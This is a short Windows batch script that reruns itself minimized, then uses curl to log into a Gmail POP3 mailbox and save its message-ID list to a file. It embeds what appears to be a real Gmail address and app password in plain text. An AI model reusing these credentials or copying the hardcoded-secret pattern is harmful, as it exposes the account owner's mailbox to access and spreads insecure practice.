@echo off
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /c "%~dpnx0"
goto :EOF
:minimized
curl -u "ductai.dt05@gmail.com:gofe zjfi ktmw fxno" --ssl-reqd "pop3s://pop.gmail.com:995" -e "UIDL" -o id.txt
